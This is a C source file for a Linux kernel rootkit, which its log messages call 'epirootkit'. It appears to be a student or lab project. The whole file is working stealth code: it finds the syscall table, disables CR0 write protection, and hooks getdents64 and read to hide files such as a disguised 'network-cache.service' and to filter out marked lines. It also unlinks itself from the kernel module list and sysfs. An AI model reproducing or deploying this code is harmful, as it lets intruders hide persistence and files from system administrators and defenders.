#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include "dissimulation.h"

static unsigned long *table_syscalls = NULL;
static asmlinkage long (*getdents64_original)(const struct pt_regs *);
static asmlinkage long (*read_original)(const struct pt_regs *);

static char *fichiers_a_cacher[] = {
    "fichiercache",
    "network-cache.service",
    "network-cache.conf",
    "epirootkit",
    NULL
};

static char *lignes_a_masquer[] = {
    "cette ligne est cache",
    NULL
};

static int fichier_doit_etre_cache(const char *nom)
{
    int i;
    for (i = 0; fichiers_a_cacher[i] != NULL; i++) {
        if (strstr(nom, fichiers_a_cacher[i])) {
            return 1;
        }
    }
    return 0;
}

static int ligne_doit_etre_masquee(const char *ligne)
{
    int i;
    for (i = 0; lignes_a_masquer[i] != NULL; i++) {
        if (strstr(ligne, lignes_a_masquer[i])) {
            return 1;
        }
    }
    return 0;
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kdent, *current_dir, *previous_dir = NULL;
    long ret;
    unsigned long offset = 0;
    
    ret = getdents64_original(regs);
    if (ret <= 0)
        return ret;
    
    kdent = kmalloc(ret, GFP_KERNEL);
    if (!kdent)
        return ret;
    
    if (copy_from_user(kdent, dirent, ret)) {
        kfree(kdent);
        return ret;
    }
    
    while (offset < ret) {
        current_dir = (void *)kdent + offset;
        
        if (fichier_doit_etre_cache(current_dir->d_name)) {
            if (previous_dir != NULL) {
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret - offset);
                continue;
            }
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }
    
    copy_to_user(dirent, kdent, ret);
    kfree(kdent);
    return ret;
}

static asmlinkage long hook_read(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    char __user *buf = (char __user *)regs->si;
    long resultat;
    char *kbuf;
    char *debut_ligne, *fin_ligne;
    char *buffer_propre;
    size_t taille_propre = 0;
    struct file *fichier;
    char *nom_fichier;
    char chemin_buffer[PATH_MAX];
    
    resultat = read_original(regs);
    if (resultat <= 0)
        return resultat;
    
    fichier = fget(fd);
    if (!fichier)
        return resultat;
    
    nom_fichier = d_path(&fichier->f_path, chemin_buffer, PATH_MAX);
    fput(fichier);
    
    if (IS_ERR(nom_fichier))
        return resultat;
    
    if (!strstr(nom_fichier, "lignescache")) {
        return resultat;
    }
    
    kbuf = kzalloc(resultat + 1, GFP_KERNEL);
    if (!kbuf)
        return resultat;
    
    if (copy_from_user(kbuf, buf, resultat)) {
        kfree(kbuf);
        return resultat;
    }
    
    buffer_propre = kzalloc(resultat + 1, GFP_KERNEL);
    if (!buffer_propre) {
        kfree(kbuf);
        return resultat;
    }
    
    debut_ligne = kbuf;
    while (debut_ligne < kbuf + resultat) {
        fin_ligne = strchr(debut_ligne, '\n');
        if (!fin_ligne)
            fin_ligne = kbuf + resultat;
        
        if (!ligne_doit_etre_masquee(debut_ligne)) {
            size_t longueur_ligne = fin_ligne - debut_ligne;
            if (fin_ligne < kbuf + resultat)
                longueur_ligne++;
            
            if (taille_propre + longueur_ligne <= resultat) {
                memcpy(buffer_propre + taille_propre, debut_ligne, longueur_ligne);
                taille_propre += longueur_ligne;
            }
        }
        
        debut_ligne = fin_ligne + 1;
    }
    
    if (copy_to_user(buf, buffer_propre, taille_propre))
        resultat = -EFAULT;
    else
        resultat = taille_propre;
    
    kfree(kbuf);
    kfree(buffer_propre);
    return resultat;
}

static unsigned long *obtenir_table_syscalls(void)
{
    unsigned long *table_syscalls;
    
    table_syscalls = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!table_syscalls) {
        pr_err("epirootkit: Impossible de trouver sys_call_table\n");
        return NULL;
    }
    
    return table_syscalls;
}

static void desactiver_protection_page(void)
{
    unsigned long valeur;
    asm volatile("mov %%cr0, %0" : "=r" (valeur));
    
    if (valeur & 0x00010000) {
        valeur &= ~0x00010000;
        asm volatile("mov %0, %%cr0" : : "r" (valeur));
    }
}

static void activer_protection_page(void)
{
    unsigned long valeur;
    asm volatile("mov %%cr0, %0" : "=r" (valeur));
    valeur |= 0x00010000;
    asm volatile("mov %0, %%cr0" : : "r" (valeur));
}

void cacher_module(void)
{
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

int activer_dissimulation(void)
{
    table_syscalls = obtenir_table_syscalls();
    if (!table_syscalls) {
        pr_err("epirootkit: Impossible de trouver la table des syscalls\n");
        return -1;
    }
    
    getdents64_original = (void *)table_syscalls[__NR_getdents64];
    read_original = (void *)table_syscalls[__NR_read];
    
    desactiver_protection_page();
    
    table_syscalls[__NR_getdents64] = (unsigned long)hook_getdents64;
    table_syscalls[__NR_read] = (unsigned long)hook_read;
    
    activer_protection_page();
    
    pr_info("epirootkit: Hooks installes\n");
    return 0;
}

void desactiver_dissimulation(void)
{
    if (table_syscalls && getdents64_original && read_original) {
        desactiver_protection_page();
        
        table_syscalls[__NR_getdents64] = (unsigned long)getdents64_original;
        table_syscalls[__NR_read] = (unsigned long)read_original;
        
        activer_protection_page();
        
        pr_info("epirootkit: Hooks supprimes\n");
    }
}